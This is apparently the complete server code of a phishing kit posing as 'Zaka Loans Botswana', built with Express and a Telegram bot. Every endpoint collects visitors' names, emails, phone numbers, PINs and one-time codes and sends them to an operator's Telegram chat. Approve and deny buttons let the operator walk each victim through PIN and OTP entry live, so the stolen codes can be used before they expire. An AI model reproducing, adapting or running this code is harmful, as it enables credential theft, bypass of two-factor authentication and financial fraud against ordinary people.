const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ✅ Personal details notification with tap-to-copy buttons for each detail
app.post('/api/personal-info-notification', async (req, res) => {
    const { firstName, lastName, email, phone } = req.body || {};
    const country = "Botswana";
    const countryCode = "+267";
    const fullPhone = `${countryCode}${phone}`;

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const message = `🇧🇼 <b>ZAKA LOANS BOTSWANA - PERSONAL DETAILS SUBMITTED</b>

👤 <b>First Name:</b> ${firstName || 'N/A'}
👤 <b>Last Name:</b> ${lastName || 'N/A'}
📧 <b>Email:</b> ${email || 'N/A'}
🌍 <b>Country:</b> ${country} (${countryCode})
📱 <b>Phone Number:</b> ${fullPhone}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: `📋 Copy Name: ${firstName} ${lastName}`, copy_text: { text: `${firstName} ${lastName}` } }
                    ],
                    [
                        { text: `📋 Copy Email: ${email}`, copy_text: { text: `${email}` } }
                    ],
                    [
                        { text: `📱 Copy Number: ${fullPhone}`, copy_text: { text: `${fullPhone}` } }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ Login notification with tap-to-copy buttons for phone and PIN
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Botswana";
    const countryCode = "+267";
    const fullPhone = `${countryCode}${phone}`;

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `🇧🇼 <b>ZAKA LOANS BOTSWANA - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🌍 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${fullPhone}
🔢 <b>PIN (5 digits):</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: `📱 Copy Number: ${fullPhone}`, copy_text: { text: `${fullPhone}` } },
                        { text: `🔢 Copy PIN: ${pin}`, copy_text: { text: `${pin}` } }
                    ],
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ OTP verification notification with tap-to-copy buttons for phone and OTP code
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Botswana";
    const countryCode = "+267";
    const fullPhone = `${countryCode}${phone}`;
    
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🇧🇼 <b>ZAKA LOANS BOTSWANA - 6-DIGIT OTP NEEDED</b>
🌍 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${fullPhone}
🔑 <b>VERIFICATION CODE (6 DIGITS):</b> <code>${code}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Verify the credentials:</b>
⏰ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: `📱 Copy Number: ${fullPhone}`, copy_text: { text: `${fullPhone}` } },
                        { text: `🔑 Copy OTP: ${code}`, copy_text: { text: `${code}` } }
                    ],
                    [
                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>LOGIN APPROVED</b>

🇧🇼 <b>Botswana</b>
📱 <b>+267${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: 6-Digit OTP</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `📱 Copy Number: +267${phone}`, copy_text: { text: `+267${phone}` } },
                    { text: `🔐 Copy PIN: ${pin}`, copy_text: { text: `${pin}` } }
                ]
            ]
        }
    });
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>

🇧🇼 <b>Botswana</b>
📱 <b>+267${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `📱 Copy Number: +267${phone}`, copy_text: { text: `+267${phone}` } }
                ]
            ]
        }
    });
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `✅ <b>6-DIGIT OTP VERIFIED</b>

🇧🇼 <b>Botswana</b>
📱 <b>+267${phone}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: OTP verified</b>
✅ <b>Process Complete</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `📱 Copy Number: +267${phone}`, copy_text: { text: `+267${phone}` } }
                ]
            ]
        }
    });
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>OTP WRONG</b>\n📱 <b>User:</b> +267${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `📱 Copy Number: +267${phone}`, copy_text: { text: `+267${phone}` } }
                ]
            ]
        }
    });
});

bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("Contact Us Clicked");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>CONTACT REQUESTED</b>\n📱 <b>User:</b> +267${phone}\n⚠️ <b>User requested contact support.</b>`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `📱 Copy Number: +267${phone}`, copy_text: { text: `+267${phone}` } }
                ]
            ]
        }
    });
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> +267${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `📱 Copy Number: +267${phone}`, copy_text: { text: `+267${phone}` } }
                ]
            ]
        }
    });
});

app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
